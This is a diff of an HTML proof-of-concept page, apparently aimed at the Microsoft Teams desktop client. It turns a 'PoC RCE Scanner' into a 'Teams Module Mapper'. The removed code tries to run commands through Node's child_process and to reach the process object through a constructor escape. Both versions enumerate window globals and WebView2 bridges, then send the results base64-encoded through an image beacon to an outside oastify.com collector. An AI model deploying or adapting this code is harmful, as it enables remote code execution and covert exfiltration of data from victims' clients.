@@ -1,58 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC RCE Scanner</title>
+  <title>Teams Module Mapper + WebView2 Check</title>
 </head>
 <body>
-  <h1>Scanning...</h1>
+  <h1>Scanning Teams Modules...</h1>
 
   <script>
     (async () => {
-      const result = {
+      const inventory = {
         origin: location.origin,
         hostname: location.hostname,
         userAgent: navigator.userAgent,
-        dangerousGlobals: [],
-        rce: {
-          hasRequire: false,
-          hasProcess: false,
-          processVersion: null,
-          childProcessExec: false,
-          error: null
+        foundModules: {},
+        errors: [],
+        specialChecks: {
+          chromeWebview: false,
+          chromeWebviewPostMessage: false
         }
       };
 
-      // Coletar objetos suspeitos
-      const keys = Object.keys(window);
-      result.dangerousGlobals = keys.filter(k => {
-        try {
-          return ["require", "process", "electron", "node", "appShell"].includes(k) ||
-                 typeof window[k] === "function" || typeof window[k] === "object";
-        } catch {
-          return false;
-        }
-      });
-
-      // Tentar abusar de require/process
+      // Verificação direta de WebView2
       try {
-        if ("require" in window) {
-          result.rce.hasRequire = true;
-          const cp = window.require('child_process');
-          cp.exec('calc'); // tentativa de RCE silenciosa
-          result.rce.childProcessExec = true;
+        if (window.chrome && window.chrome.webview) {
+          inventory.specialChecks.chromeWebview = true;
+          if (typeof window.chrome.webview.postMessage === "function") {
+            inventory.specialChecks.chromeWebviewPostMessage = true;
+          }
         }
-
-        const proc = window.constructor.constructor("return process")();
-        result.rce.hasProcess = true;
-        result.rce.processVersion = proc.version;
       } catch (e) {
-        result.rce.error = String(e);
+        inventory.errors.push({ check: "chrome.webview", error: String(e) });
       }
 
-      // Enviar resultado em 1 única request
-      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
+      // Escaneia objetos/funções no window
+      const windowKeys = Object.keys(window);
+      for (const key of windowKeys) {
+        try {
+          const val = window[key];
+          if (typeof val === "function") {
+            inventory.foundModules[key] = "function";
+          } else if (typeof val === "object" && val !== null) {
+            const props = Object.getOwnPropertyNames(val);
+            inventory.foundModules[key] = {
+              type: "object",
+              props: props.slice(0, 20)
+            };
+          }
+        } catch (err) {
+          inventory.errors.push({ key, error: String(err) });
+        }
+      }
+
+      // Envia resultado em 1 request
+      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(inventory))));
       const url = "https://j9tu8az13ssynazi9fayiqrv8med23qs.oastify.com/?resposta=" + base64;
-      (new Image()).src = url;
+
+      const img = new Image();
+      img.src = url;
     })();
   </script>
 </body>
